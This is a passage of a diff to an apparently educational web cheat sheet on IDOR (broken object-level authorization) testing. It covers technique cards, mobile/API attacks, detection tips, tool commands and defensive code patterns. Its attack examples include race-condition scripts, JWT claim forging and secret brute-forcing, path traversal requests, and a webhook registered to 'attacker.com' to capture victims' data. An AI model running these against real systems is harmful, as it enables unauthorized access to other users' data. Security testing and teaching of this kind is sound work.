+   code:`# Turbo Intruder script:\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n        concurrentConnections=50,\n        requestsPerConnection=50)\n    for i in range(50):\n        engine.queue(target.req, str(victim_id))\n\n# Also use HTTP/2 single-packet attack:\n# All requests arrive simultaneously\n# Auth checked for first, action runs for all`,
+   tip:"<b>Pro tip:</b> HTTP/2 single-packet attack eliminates network jitter — more reliable than HTTP/1.1 racing."},
+  {title:"GraphQL introspection → IDOR mapping",risk:"high",rl:"High",
+   desc:"Use introspection to discover all object types, then systematically test each type for IDOR.",
+   code:`# Introspection query:\n{ __schema { types { name fields { name } } } }\n\n# Discover types with ID arguments:\n{ __type(name:"User") {\n    fields { name args { name type { name } } } } }\n\n# Test each type with victim IDs:\n{ order(id:"ORD-victim") { total items } }\n{ invoice(id:"INV-victim") { amount } }\n{ document(id:"DOC-victim") { content } }`,
+   tip:"<b>Pro tip:</b> InQL Burp plugin automates introspection and generates test queries for all types."},
+  {title:"OAuth/OIDC token confusion IDOR",risk:"critical",rl:"Critical",
+   desc:"OAuth flows where the sub claim, client_id, or audience isn't properly validated allow token reuse across resources.",
+   code:`# Test 1: Use token from one OAuth app in another:\n# App A token used against App B resources\n\n# Test 2: sub claim manipulation:\n# Decode JWT → change sub to victim's ID\n# Re-sign with same secret (if weak)\n\n# Test 3: Client_credentials grant abuse:\n# Machine-to-machine token accessing user resources\n# Authorization: Bearer <machine_token>\nGET /api/users/9/profile  # should require user token`,
+   tip:"<b>Pro tip:</b> M2M tokens often have broader scope than intended — test against all user endpoints."},
+  {title:"Indirect IDOR via reference object",risk:"high",rl:"High",
+   desc:"Access victim's data by referencing an object that contains a reference to them — instead of directly referencing the victim.",
+   code:`# Direct IDOR (blocked):\nGET /api/user/9  → 403\n\n# Indirect via shared object:\nGET /api/comment/COMMENT-001  # attacker owns this\n# Response: {"author": {user_id:9, email:"victim@x.com"}}\n# Victim's data leaked through nested object!\n\n# Indirect via activity log:\nGET /api/activity?resource_id=MY-DOC\n# Shows who else viewed MY-DOC — leaks user IDs`,
+   tip:"<b>Pro tip:</b> Check all nested objects in API responses for other users' data leakage."},
+  {title:"Insecure file path IDOR",risk:"high",rl:"High",
+   desc:"File download/access endpoints that construct paths from user input without ownership validation.",
+   code:`# Static file IDOR:\nGET /uploads/user_9/profile.jpg\nGET /exports/invoice_victim_001.pdf\nGET /static/reports/user_9_q3.csv\n\n# Path traversal variant:\nGET /api/file?path=../user_9/secret.txt\nGET /api/download?file=../../victim/data.json\n\n# Presigned URL IDOR:\n# S3 presigned URLs with predictable object keys`,
+   tip:"<b>Pro tip:</b> S3 keys often follow patterns like users/{user_id}/files/{filename} — enumerate them."},
+  {title:"Webhook & callback IDOR",risk:"high",rl:"High",
+   desc:"Webhooks or callbacks that use resource IDs from the original request without re-validating ownership at delivery time.",
+   code:`# Register webhook for victim's resource:\nPOST /api/webhooks\n{"resource_id": "ORDER-victim-001",\n "callback_url": "https://attacker.com/catch"}\n\n# When victim's order updates, webhook fires to attacker\n# Receiving victim's order data at attacker's server!`},
+  {title:"Email action link IDOR",risk:"critical",rl:"Critical",
+   desc:"Email-based action links (unsubscribe, confirm, approve) where the token is bound to the email but not to the specific resource.",
+   code:`# Unsubscribe link:\nhttps://app.com/unsubscribe?token=VALID_TOKEN&list_id=9\n# VALID_TOKEN is attacker's token for list 10\n# If server accepts token without checking list ownership:\n# → victim's list 9 gets unsubscribed!\n\n# Also test:\n/confirm?token=attacker_token&order_id=victim_order\n/approve?token=attacker_token&request_id=victim_request`,
+   tip:"<b>Pro tip:</b> Action tokens in emails are frequently validated for structure/expiry but not resource binding."},
+  {title:"Cache poisoning IDOR",risk:"critical",rl:"Critical",
+   desc:"Poison a cache entry so victim receives attacker's data (or vice versa), or access cached responses meant for other users.",
+   code:`# Cache key confusion:\nGET /api/users/9\nHost: victim.app.com\nX-Forwarded-Host: attacker.app.com\n# If cache key uses X-Forwarded-Host, poisons victim's cache\n\n# Shared cache IDOR:\nGET /api/profile\n# If response cached globally (not per-user)\n# Attacker's profile returned to victim or vice versa`,
+   tip:"<b>Pro tip:</b> Check Vary header — if it doesn't include Authorization, response may be shared across users."},
+]},
+
+{id:14,label:"Mobile & APIs",fullLabel:"Mobile App & API-Specific",tag:"Mobile",tc:"tag-mobile",
+info:"Mobile applications and their backend APIs have unique IDOR patterns. Mobile apps often expose undocumented endpoints and weaker auth flows.",
+techniques:[
+  {title:"Mobile API endpoint discovery",risk:"high",rl:"High",
+   desc:"Decompile mobile apps to find hidden API endpoints not exposed in web UI or Swagger docs.",
+   code:`# Android APK:\njadx -d output/ app.apk\ngrep -rE '/api/v[0-9]+/[a-z]+' output/\nstrings app.apk | grep -E '^/api'\n\n# iOS IPA (after unzip):\nstrings Payload/App.app/App | grep '/api'\notool -l binary | grep -A3 '__TEXT'\n\n# Runtime interception:\nfrida -U -f com.target.app --no-pause \\\n  -l intercept_https.js`,
+   tip:"<b>Pro tip:</b> React Native apps bundle JS — search main.jsbundle for all API calls."},
+  {title:"Device ID & IMEI-based IDOR",risk:"high",rl:"High",
+   desc:"Mobile apps that use device identifiers (IMEI, Android ID, IDFA) as object references can be guessed or obtained.",
+   code:`# Device-scoped IDOR:\nGET /api/device/DEVICE-ID-123/config\nGET /api/push-token/TOKEN-ABC/settings\n\n# Attack: obtain victim's device ID via:\n# - BLE/NFC scanning\n# - ARP cache\n# - MDM enrollment records\n# - Physical access briefly\n\n# Replace attacker device ID with victim's`},
+  {title:"Deep link / intent IDOR",risk:"medium",rl:"Medium",
+   desc:"Android deep links or iOS Universal Links that accept resource IDs in the URL path without auth validation.",
+   code:`# Deep link IDOR (Android):\nadb shell am start \\\n  -a android.intent.action.VIEW \\\n  -d "app://target/invoice/VICTIM-INV-001"\n\n# Universal Link (iOS):\nhttps://app.example.com/invoice/VICTIM-INV-001\n# If app opens and shows victim's invoice → IDOR`},
+  {title:"API key / OAuth token IDOR",risk:"critical",rl:"Critical",
+   desc:"Mobile apps embed API keys. Test if these keys can access any user's data or are scoped per-user.",
+   code:`# Extract API key from APK:\ngrep -rE 'api_key|apiKey|API_KEY' output/\nstrings app.apk | grep -E '^[A-Za-z0-9]{32}'\n\n# Test scope:\ncurl /api/users/9 \\\n  -H "X-API-Key: EXTRACTED_KEY"\n# If returns victim data → API key not user-scoped`,
+   tip:"<b>Pro tip:</b> Firebase API keys in mobile apps often have overly broad Firestore rules."},
+  {title:"Background sync IDOR",risk:"medium",rl:"Medium",
+   desc:"Background sync requests that include user/resource IDs often lack the same auth as foreground requests.",
+   code:`# Background sync (Service Worker):\nPOST /api/sync\n{"user_id": 9, "last_sync": "2024-01-01"}\n# May use different auth (background token)\n# Test if background token can sync other users' data\n\n# WorkManager (Android) sync:\nPOST /api/background-fetch\n{"device_id": "attacker-device", "user_id": 9}`},
+  {title:"Push notification IDOR",risk:"medium",rl:"Medium",
+   desc:"Push notification endpoints that accept target user IDs can be abused to send notifications to other users.",
+   code:`# Register attacker's push token for victim's account:\nPOST /api/push/register\n{"push_token": "attacker_FCM_token",\n "user_id": 9}\n# Victim's notifications sent to attacker!\n\n# Or trigger push to victim:\nPOST /api/notify\n{"user_id": 9, "message": "You've been hacked"}`},
+]},
+
+{id:15,label:"Detection",fullLabel:"False Negative Detection",tag:"Recon",tc:"tag-recon",
+info:"IDOR checks often produce false negatives — appearing blocked when they aren't. Use these techniques to eliminate blind spots in your testing.",
+techniques:[
+  {title:"Compare body content, not just status code",risk:"critical",rl:"Critical",
+   desc:"A 200 OK with empty body is NOT the same as a 200 OK with victim's data. Compare content-length, response body, and specific fields.",
+   code:`# Status 200 can mean IDOR or protection:\n# Attacker accesses own resource:\n# 200 OK {"user_id":10, "data":"attacker_data"}\n\n# Attacker accesses victim resource (IDOR):\n# 200 OK {"user_id":9, "data":"victim_data"}\n\n# Attacker blocked (false positive 200):\n# 200 OK {"user_id":10, "data":null}  # empty!\n\n# Always check: is user_id in response = 9 or 10?`,
+   tip:"<b>Pro tip:</b> Autorize can have false greens if responses differ by small amount — always read the body."},
+  {title:"Retry after logout/login cycle",risk:"high",rl:"High",
+   desc:"Server-side role/permission caches can produce false negatives. Invalidate the cache by logging out and back in, then re-test.",
+   code:`# Cache-busting process:\n1. Test IDOR → 403 (may be cached auth)\n2. Logout completely\n3. Clear all cookies/tokens\n4. Login fresh\n5. Re-test same IDOR\n\n# Also try:\n- Password change then re-test\n- Token refresh then re-test\n- Different browser/incognito session`},
+  {title:"Test unauthenticated access",risk:"critical",rl:"Critical",
+   desc:"Remove auth header entirely. Some endpoints forget authentication entirely on certain methods or subpaths.",
+   code:`# Remove all auth:\ncurl /api/users/9\n# No Authorization header\n# No Cookie\n# No API key\n\n# Also test with invalid token:\ncurl /api/users/9 \\\n  -H "Authorization: Bearer INVALID_TOKEN"\n\n# And expired token:\ncurl /api/users/9 \\\n  -H "Authorization: Bearer EXPIRED_TOKEN"`,
+   tip:"<b>Pro tip:</b> HEAD requests on endpoints sometimes bypass auth that applies to GET."},
+  {title:"Check all HTTP methods systematically",risk:"high",rl:"High",
+   desc:"An endpoint may have IDOR only on specific methods. Test all of them — especially PUT, PATCH, DELETE.",
+   code:`for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do\n  curl -X $method \\\n    -H "Authorization: Bearer ATTACKER_TOKEN" \\\n    https://target/api/resource/VICTIM_ID \\\n    -o /dev/null -s -w "$method: %{http_code}\\n"\ndone\n\n# Expected: all should be 403\n# IDOR: any non-403/401 response`},
+  {title:"Test via direct API vs. web UI",risk:"medium",rl:"Medium",
+   desc:"Web UI may add extra auth headers or enforce checks the API doesn't. Always test the raw API, not the browser UI.",
+   code:`# Web UI request (may add extra headers):\n# X-CSRF-Token, X-Request-ID, Origin checks\n\n# Direct API (strip extra headers):\ncurl /api/resource/9 \\\n  -H "Authorization: Bearer TOKEN"\n# No CSRF token, no Origin header\n# Backend may only check auth token`,
+   tip:"<b>Pro tip:</b> Test from Postman, curl, and mobile to find path-specific differences."},
+  {title:"Batch endpoint per-item vs. per-collection auth",risk:"high",rl:"High",
+   desc:"Batch endpoints often auth the collection once, not each item. Mix victim IDs in arrays to test per-item validation.",
+   code:`# Collection auth (vulnerable):\nPOST /api/documents/batch\n{"ids": [ATTACKER_DOC, VICTIM_DOC_101, VICTIM_DOC_102]}\n# Server checks: is user authenticated? ✓\n# Server skips: do all IDs belong to user? ✗\n# Returns all 3 documents!`},
+  {title:"Error message information disclosure",risk:"medium",rl:"Medium",
+   desc:"Different error codes for owned vs. non-owned vs. non-existent resources confirm IDOR even without data access.",
+   code:`# Test ID existence via error differentiation:\nGET /api/resource/YOUR_ID     → 200 (exists, yours)\nGET /api/resource/VICTIM_ID   → 403 (exists, not yours!) ← IDOR\nGET /api/resource/RANDOM_9999 → 404 (doesn't exist)\n\n# A 403 on a specific ID confirms:\n1. The ID exists\n2. The resource belongs to someone else\n3. Auth check IS present but behavioral IDOR may exist`,
+   tip:"<b>Pro tip:</b> Even 403s confirm resource existence — useful for blind enumeration."},
+  {title:"WebSocket & SSE endpoint testing",risk:"high",rl:"High",
+   desc:"Real-time endpoints are often excluded from IDOR testing scope. Always include them.",
+   code:`# WebSocket testing checklist:\n# 1. Connect with attacker credentials\n# 2. Subscribe to victim's channel ID\n# 3. Monitor for victim's events\n\n# SSE testing:\ncurl -H "Authorization: Bearer ATTACKER" \\\n     -H "Accept: text/event-stream" \\\n     "https://target.com/api/events?user_id=VICTIM"\n\n# gRPC streaming:\ngrpcurl -d '{"user_id": 9}' target:9090 \\\n  StreamService/SubscribeUser`},
+]},
+
+{id:16,label:"Automation",fullLabel:"Tools & Automation",tag:"Automation",tc:"tag-auto",
+info:"Automate IDOR discovery to cover large attack surfaces systematically.",
+isTools:true,
+tools:[
+  {name:"ffuf",desc:"Fast web fuzzer for enumerating sequential IDs, UUIDs, and custom patterns at high speed.",
+   cmd:`ffuf -u https://target/api/user/FUZZ \\\n  -w ids.txt \\\n  -H "Authorization: Bearer TOKEN" \\\n  -fc 403,404,401 -mc all \\\n  -fs 0 -o hits.json -of json\n\n# Generate ID wordlist:\nseq 1 100000 > ids.txt\nuuidgen | head -1000 >> ids.txt`},
+  {name:"Burp Autorize",desc:"Replays every request with a second user's token. Flags similar responses as potential IDOR.",
+   cmd:`# Setup:\n1. Install Autorize from BApp Store\n2. Add victim's token in Autorize tab\n3. Browse app as attacker\n4. Review RED rows (similar responses)\n\n# Limitation: only tests what you browse!\n# Use with Burp Scanner for broader coverage`},
+  {name:"Turbo Intruder",desc:"High-speed Burp intruder for race conditions and large ID ranges. Supports HTTP/2 single-packet attack.",
+   cmd:`# Race condition test:\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(\n        endpoint=target.endpoint,\n        concurrentConnections=50,\n        pipeline=True)\n    for id in range(1, 1000):\n        engine.queue(target.req, str(id))\n\n# HTTP/2 single-packet attack:\n# Engine config: requestsPerConnection=50\n# All arrive simultaneously → races auth`},
+  {name:"Arjun",desc:"Discovers hidden HTTP parameters in query strings and JSON bodies that backends process silently.",
+   cmd:`# Discover hidden params:\narjun -u https://target/api/messages \\\n      -m GET --include-large\n\narjun -u https://target/api/data \\\n      -m POST -T 5\n\n# Output: found ?user_id= ?account_id= etc.\n# Then test each with victim IDs`},
+  {name:"ParamMiner",desc:"Burp extension — mines parameters from JS files, response headers, and reflection patterns.",
+   cmd:`# In Burp:\nExtensions → BApp Store → ParamMiner\nRight-click request → Guess params\n\n# Modes:\n# Guess headers\n# Guess params (query)\n# Guess JSON params (body)\n\n# Best used on: complex SPA pages`},
+  {name:"grpcurl",desc:"Command-line tool for testing gRPC services. Essential for gRPC IDOR testing.",
+   cmd:`# List services:\ngrpcurl -plaintext target.com:9090 list\n\n# List methods:\ngrpcurl -plaintext target.com:9090 \\\n  list user.UserService\n\n# Test IDOR:\ngrpcurl -plaintext \\\n  -d '{"user_id": 9}' \\\n  target.com:9090 \\\n  user.UserService/GetUser`},
+  {name:"jwt_tool",desc:"JWT testing toolkit — modify claims, brute force secrets, test alg:none attacks.",
+   cmd:`# Modify user_id claim:\npython3 jwt_tool.py TOKEN -T \\\n  -pc sub -pv "9" -X a\n\n# Brute force secret:\npython3 jwt_tool.py TOKEN -C \\\n  -d rockyou.txt\n\n# Test none algorithm:\npython3 jwt_tool.py TOKEN -X a\n\n# Forge with found secret:\npython3 jwt_tool.py TOKEN -T -pc sub -pv "1" -ps "secret"`},
+  {name:"InQL (GraphQL)",desc:"Burp extension for GraphQL analysis — introspection, query generation, and batch IDOR testing.",
+   cmd:`# In Burp:\nExtensions → BApp Store → InQL Scanner\n\n# Features:\n# Auto-introspection of GraphQL schema\n# Generate queries for all types\n# Test mutations for IDOR\n# Batch query construction\n\n# Manual introspection:\ncurl -X POST /graphql \\\n  -d '{"query":"{ __schema { types { name } } }"}'`},
+  {name:"Nuclei Templates",desc:"Community IDOR templates for automated detection of common patterns.",
+   cmd:`# Run IDOR templates:\nnuclei -u https://target.com \\\n  -tags idor,bola \\\n  -H "Authorization: Bearer TOKEN"\n\n# Custom template example:\nnuclei -u https://target/api/user/{{id}} \\\n  -var id=9 \\\n  -matcher-condition and \\\n  -status 200`},
+  {name:"OWASP ZAP + IDOR addon",desc:"ZAP with IDOR addon for semi-automated spider + multi-user auth testing.",
+   cmd:`# ZAP Active Scan with two sessions:\n# Session A: attacker (spider + scan)\n# Session B: victim (comparison)\n\n# Context setup:\n# Add both sessions to same context\n# Enable User-driven scan\n\n# Script: compare A vs B responses\n# Flag similar content-lengths`},
+  {name:"Postman / Newman",desc:"API testing with Postman collections — automate cross-user ID testing with collection runner.",
+   cmd:`# Postman test script:\npm.test("No IDOR", function () {\n  const body = pm.response.json();\n  pm.expect(body.user_id).to.not.equal(9);\n  pm.expect(pm.response.code).to.be.oneOf([401,403]);\n});\n\n# Run with victim IDs as variables:\nnewman run collection.json \\\n  --env-var "target_id=9"`},
+  {name:"Python IDOR automation script",desc:"Custom Python script for systematic cross-user authorization testing.",
+   cmd:`import requests, json\n\ndef idor_test(base, token_a, victim_ids):\n    h = {"Authorization": f"Bearer {token_a}"}\n    results = []\n    for rid in victim_ids:\n        for m in ["GET","PUT","PATCH","DELETE"]:\n            r = requests.request(m,\n              f"{base}/api/resource/{rid}",\n              headers=h, timeout=5)\n            if r.status_code not in [401,403,404]:\n                results.append({"method":m,\n                  "id":rid,"status":r.status_code})\n    return results`},
+]},
+
+{id:17,label:"Defense",fullLabel:"Defense & Prevention Patterns",tag:"Defense",tc:"tag-defense",
+info:"Understanding defense patterns makes you a better tester — you know what to look for when these patterns are broken or incomplete.",
+techniques:[
+  {title:"Always derive identity from session",risk:"critical",rl:"Critical",
+   desc:"The golden rule: never trust client-supplied user IDs. Always derive the owner from the authenticated session token.",
+   code:`# VULNERABLE — trusts client input:\ndef get_docs():\n    user_id = request.args.get("user_id")  # ← NEVER\n    return Document.query.filter_by(user_id=user_id)\n\n# SECURE — from session:\ndef get_docs():\n    user_id = current_user.id  # ← always from session\n    return Document.query.filter_by(user_id=user_id)`,
+   tip:"<b>Golden Rule:</b> If user_id appears anywhere in the request body/params, it's a potential mass assignment or IDOR vector."},
+  {title:"Scope every DB query by owner",risk:"critical",rl:"Critical",
+   desc:"Always include an ownership filter in database queries. Not as an optional extra — as a structural requirement.",
+   code:`# VULNERABLE:\ndoc = Document.query.get(doc_id)  # no owner check!\n\n# SECURE — always include user_id filter:\ndoc = Document.query.filter_by(\n    id=doc_id,\n    user_id=current_user.id  # ← ownership\n).first_or_404()\n\n# Return 404 not 403 — don't reveal existence!\n# 403 confirms the resource exists (info disclosure)`,
+   tip:"<b>Pro tip:</b> Returning 404 for unauthorized resources prevents enumeration via error differentiation."},
+  {title:"Re-validate ownership at every workflow step",risk:"high",rl:"High",
+   desc:"Don't assume ownership set in step 1 carries to step 3. Every API endpoint must independently validate.",
+   code:`# Step 3 endpoint — re-validate explicitly:\n@app.post("/api/requests/resume")\n@login_required\ndef resume_request():\n    request_id = request.json["request_id"]\n    \n    # Re-validate at THIS step:\n    req = ApprovalRequest.query.filter_by(\n        id=request_id,\n        owner_id=current_user.id,  # ← re-check\n        status="DRAFT"\n    ).first_or_404()\n    \n    return process_resume(req)`},
+  {title:"Block mass assignment — use allowlists",risk:"critical",rl:"Critical",
+   desc:"Never pass request body directly to ORM. Always use explicit field allowlists.",
+   code:`// VULNERABLE:\napp.put('/profile', auth, (req, res) => {\n    User.update(req.body, {where: {id: req.user.id}})\n    // ← accepts everything including role, user_id!\n})\n\n// SECURE — explicit allowlist:\nconst ALLOWED = ['name','email','phone','bio']\nconst updates = Object.keys(req.body)\n    .filter(k => ALLOWED.includes(k))\n    .reduce((obj, k) => ({...obj, [k]: req.body[k]}), {})\nUser.update(updates, {where: {id: req.user.id}})`},
+  {title:"Implement tenant isolation at ORM level",risk:"critical",rl:"Critical",
+   desc:"For multi-tenant apps, enforce tenant isolation in the data access layer — not just in business logic.",
+   code:`# Tenant-aware session wrapper:\nclass TenantSession:\n    def __init__(self, tenant_id):\n        self.tenant_id = tenant_id\n    \n    def query(self, model):\n        if hasattr(model, 'tenant_id'):\n            return db.session.query(model).filter(\n                model.tenant_id == self.tenant_id\n            )\n        return db.session.query(model)\n\n# Usage:\ng.db = TenantSession(current_user.org_id)\ncustomers = g.db.query(Customer).all()  # auto-scoped`},
+  {title:"Use indirect object references",risk:"medium",rl:"Medium",
+   desc:"Map user-facing IDs to internal IDs server-side. User never sees the real database ID.",
+   code:`# Mapping table per session:\nuser_map = {\n    "ref1": "actual_db_id_1234",\n    "ref2": "actual_db_id_5678",\n}\n\n# User sees: GET /api/document/ref1\n# Server resolves: actual_id = user_map["ref1"]\n# Attacker can't guess "actual_db_id_5678"\n\n# Note: This prevents enumeration but\n# does NOT replace ownership checks!`,
+   tip:"<b>Note:</b> Indirect references help against enumeration but are NOT a substitute for auth checks."},
+  {title:"IDOR-safe GraphQL patterns",risk:"high",rl:"High",
+   desc:"GraphQL resolvers must enforce ownership — gateway-level auth is insufficient.",
+   code:`// VULNERABLE resolver:\nconst resolvers = {\n    document: (_, {id}) => Document.findById(id)\n    // ← no ownership check!\n}\n\n// SECURE — ownership check at resolver:\nconst resolvers = {\n    document: (_, {id}, {user}) => {\n        return Document.findOne({\n            _id: id,\n            owner: user.id  // ← per-resolver check\n        })\n    }\n}\n\n// Also use DataLoader to batch\n// but still include ownership in each load`},
+  {title:"Response filtering — don't over-expose",risk:"medium",rl:"Medium",
+   desc:"Even when ownership check passes, filter the response to only include fields the user needs. Defense in depth.",
+   code:`# Don't return everything:\n# VULNERABLE:\nreturn jsonify(user.to_dict())  # returns ALL fields\n\n# SECURE — explicit field selection:\nreturn jsonify({\n    "id": user.id,\n    "name": user.name,\n    "email": user.email,\n    # NOT: password_hash, ssn, admin_notes\n})\n\n# Use serializer schemas:\nclass PublicUserSchema(Schema):\n    id = fields.Int()\n    name = fields.Str()\n    # Explicitly define what's safe to return`},
+]},
+
 ];
 
-// ===================== BUILD NAV =====================
-const navEl = document.getElementById('phaseNavInner');
-phases.forEach(p => {
-  const btn = document.createElement('button');
-  btn.className = 'phase-nav-btn';
-  btn.textContent = `P${p.id} ${p.label}`;
-  btn.dataset.id = p.id;
-  btn.onclick = () => {
-    document.getElementById(`phase-${p.id}`).scrollIntoView({ behavior: 'smooth' });
-  };
-  navEl.appendChild(btn);
+// ==================== BUILD NAV ====================
+const pni=document.getElementById('pni');
+phases.forEach(p=>{
+  const b=document.createElement('button');
+  b.className='pnb'; b.textContent=`P${p.id} ${p.label}`;
+  b.dataset.id=p.id;
+  b.onclick=()=>document.getElementById(`ph-${p.id}`).scrollIntoView({behavior:'smooth'});
+  pni.appendChild(b);
 });
 
-// ===================== BUILD CONTENT =====================
-const mainEl = document.getElementById('mainContent');
+// ==================== BUILD CONTENT ====================
+const mc=document.getElementById('mc');
 
-phases.forEach(p => {
-  const sec = document.createElement('section');
-  sec.className = 'phase-section';
-  sec.id = `phase-${p.id}`;
-
-  // Header
-  sec.innerHTML = `
-    <div class="phase-header">
-      <span class="phase-number">PHASE ${String(p.id).padStart(2,'0')}</span>
-      <h2 class="phase-title">${p.fullLabel}</h2>
-      <span class="phase-tag ${p.tagClass}">${p.tag}</span>
+phases.forEach(p=>{
+  const sec=document.createElement('section');
+  sec.className='psec'; sec.id=`ph-${p.id}`;
+  sec.innerHTML=`
+    <div class="phead">
+      <span class="pnum">PHASE ${String(p.id).padStart(2,'0')}</span>
+      <h2 class="ptitle">${p.fullLabel}</h2>
+      <span class="ptag ${p.tc}">${p.tag}</span>
     </div>
-    ${p.info ? `<div class="info-box"><strong>Overview:</strong> ${p.info}</div>` : ''}
+    ${p.info?`<div class="ibox"><strong>Overview:</strong> ${p.info}</div>`:''}
   `;
 
+  // TYPES
+  if(p.isTypes){
+    const g=document.createElement('div');g.className='vtgrid';
+    p.types.forEach(t=>{
+      const c=document.createElement('div');c.className='vtcard';
+      c.style.setProperty('--vca',t.color);
+      c.innerHTML=`<h3>${t.title}</h3><p>${t.desc}</p><div class="vcode">${t.code}</div>`;
+      g.appendChild(c);
+    });
+    sec.appendChild(g);
+
+    // CVSS scores
+    const ch=document.createElement('div');ch.className='cvss-grid';ch.style.marginTop='1rem';
+    const scores=[
+      {type:"Horizontal (read)",score:"6.5",cls:"score-med",desc:"Single user record, read-only"},
+      {type:"Horizontal (write/delete)",score:"8.8",cls:"score-high",desc:"Modify or delete another user's data"},
+      {type:"Vertical IDOR",score:"9.1",cls:"score-crit",desc:"Admin resource access, privilege escalation"},
+      {type:"Blind IDOR (delete)",score:"7.5",cls:"score-high",desc:"Data destruction, no response body"},
+      {type:"Second-Order IDOR",score:"7.5–9.5",cls:"score-crit",desc:"Depends on workflow step severity"},
+      {type:"Multi-Tenant IDOR",score:"9.1",cls:"score-crit",desc:"Always Critical — full org exposure"},
+      {type:"Mass Assignment",score:"8.8–9.1",cls:"score-crit",desc:"Role escalation or ownership change"},
+    ];
+    scores.forEach(s=>{
+      const c=document.createElement('div');c.className='cvss-card';
+      c.innerHTML=`<div class="cvss-type">${s.type}</div><div class="cvss-score ${s.cls}">${s.score}</div><div class="cvss-desc">${s.desc}</div>`;
+      ch.appendChild(c);
+    });
+    sec.appendChild(ch);
+  }
+
   // PAYLOAD TABLE
-  if (p.isTable) {
-    const tbl = document.createElement('div');
-    tbl.style.background = 'var(--surface)';
-    tbl.style.border = '1px solid var(--border)';
-    tbl.style.borderRadius = '12px';
-    tbl.style.overflow = 'hidden';
-    tbl.innerHTML = `
-      <table class="payload-table">
-        <thead><tr>
-          <th>Variant</th>
-          <th>Description</th>
-          <th>Example Payload</th>
-        </tr></thead>
-        <tbody>
-          ${p.payloads.map(pl => `<tr>
-            <td>${pl.variant}</td>
-            <td style="color:var(--text2)">${pl.desc}</td>
-            <td>${pl.example}</td>
-          </tr>`).join('')}
-        </tbody>
-      </table>
-    `;
-    sec.appendChild(tbl);
+  else if(p.isTable){
+    const w=document.createElement('div');w.className='tbl-wrap';
+    w.innerHTML=`<table class="ptable">
+      <thead><tr><th>Variant</th><th>Description</th><th>Example</th></tr></thead>
+      <tbody>${p.payloads.map(pl=>`<tr>
+        <td>${pl.v}</td>
+        <td style="color:var(--text2)">${pl.d}</td>
+        <td>${pl.e}</td>
+      </tr>`).join('')}</tbody>
+    </table>`;
+    sec.appendChild(w);
   }
 
   // TOOLS
-  else if (p.isTools) {
-    const grid = document.createElement('div');
-    grid.className = 'tool-grid';
-    p.tools.forEach(t => {
-      const card = document.createElement('div');
-      card.className = 'tool-card';
-      card.innerHTML = `
-        <div class="tool-name">${t.name}</div>
-        <div class="tool-desc">${t.desc}</div>
-        <pre class="tool-cmd">${t.cmd}</pre>
-      `;
-      grid.appendChild(card);
+  else if(p.isTools){
+    const g=document.createElement('div');g.className='tgrid';
+    p.tools.forEach(t=>{
+      const c=document.createElement('div');c.className='tcard';
+      c.innerHTML=`<div class="tname">${t.name}</div><div class="tdesc">${t.desc}</div><pre class="tcmd">${t.cmd}</pre>`;
+      g.appendChild(c);
     });
-    sec.appendChild(grid);
-  }
-
-  // CHECKLIST
-  else if (p.isChecklist) {
-    const ul = document.createElement('ul');
-    ul.className = 'checklist';
-    p.items.forEach(item => {
-      const li = document.createElement('li');
-      li.textContent = item;
-      ul.appendChild(li);
-    });
-    const wrap = document.createElement('div');
-    wrap.style.background = 'var(--surface)';
-    wrap.style.border = '1px solid var(--border)';
-    wrap.style.borderRadius = '12px';
-    wrap.style.padding = '1rem 1.25rem';
-    wrap.appendChild(ul);
-    sec.appendChild(wrap);
-  }
-
-  // PRIORITY
-  else if (p.isPriority) {
-    const ul = document.createElement('ul');
-    ul.className = 'priority-list';
-    const rankColors = ['p1','p2','p3','p4','p5','p6'];
-    p.items.forEach((item, i) => {
-      const li = document.createElement('li');
-      li.className = 'priority-item';
-      li.innerHTML = `
-        <span class="priority-rank ${rankColors[i]}">#${item.rank}</span>
-        <div>
-          <div style="font-size:14px;font-weight:600;color:var(--text)">${item.label}</div>
-          <div style="font-size:12px;color:var(--text2);margin-top:2px">${item.detail}</div>
-        </div>
-      `;
-      ul.appendChild(li);
-    });
-    sec.appendChild(ul);
+    sec.appendChild(g);
   }
 
   // TECHNIQUE CARDS
-  else if (p.techniques) {
-    const grid = document.createElement('div');
-    grid.className = 'cards-grid';
-    p.techniques.forEach(t => {
-      const card = document.createElement('div');
-      card.className = 'technique-card';
-      const accentMap = { critical: '#ff4d6d', high: '#ff964d', medium: '#f9c74f', low: '#43e97b', info: '#4cc9f0' };
-      card.style.setProperty('--card-accent', accentMap[t.risk] || '#6c63ff');
-      card.innerHTML = `
-        <div class="card-head">
-          <span class="card-risk risk-${t.risk}">${t.riskLabel}</span>
-          <span class="card-title">${t.title}${t.isNew ? '<span class="new-badge">New</span>' : ''}</span>
-          <span class="card-toggle">+</span>
+  else if(p.techniques){
+    const g=document.createElement('div');g.className='cgrid';
+    p.techniques.forEach(t=>{
+      const accentMap={critical:'#ff4d6d',high:'#ff964d',medium:'#f9c74f',low:'#43e97b',info:'#4cc9f0'};
+      const c=document.createElement('div');c.className='card';
+      c.style.setProperty('--ca',accentMap[t.risk]||'#6c63ff');
+      c.innerHTML=`
+        <div class="chead">
+          <span class="crisk r-${t.risk}">${t.rl}</span>
+          <span class="ctitle">${t.title}${t.isNew?'<span class="nbadge">New</span>':''}${t.isUpd?'<span class="ubadge">Updated</span>':''}</span>
+          <span class="ctog">+</span>
         </div>
-        <div class="card-body">
-          <p class="card-desc">${t.desc}</p>
-          <pre class="card-code">${t.code}</pre>
+        <div class="cbody">
+          <p class="cdesc">${t.desc}</p>
+          <pre class="ccode">${t.code}</pre>
+          ${t.tip?`<div class="ctip">${t.tip}</div>`:''}
         </div>
       `;
-      card.querySelector('.card-head').onclick = () => {
-        card.classList.toggle('open');
-      };
-      grid.appendChild(card);
+      c.querySelector('.chead').onclick=()=>c.classList.toggle('open');
+      g.appendChild(c);
     });
-    sec.appendChild(grid);
+    sec.appendChild(g);
   }
 
-  sec.appendChild(Object.assign(document.createElement('hr'), { className: 'divider' }));
-  mainEl.appendChild(sec);
+  sec.appendChild(Object.assign(document.createElement('hr'),{className:'div'}));
+  mc.appendChild(sec);
 });
 
-// ===================== STICKY NAV HIGHLIGHT =====================
-const sections = document.querySelectorAll('.phase-section');
-const navBtns = document.querySelectorAll('.phase-nav-btn');
-const observer = new IntersectionObserver(entries => {
-  entries.forEach(e => {
-    if (e.isIntersecting) {
-      const id = e.target.id.replace('phase-','');
-      navBtns.forEach(b => b.classList.toggle('active', b.dataset.id == id));
+// ==================== SEARCH ====================
+const searchBox=document.getElementById('searchBox');
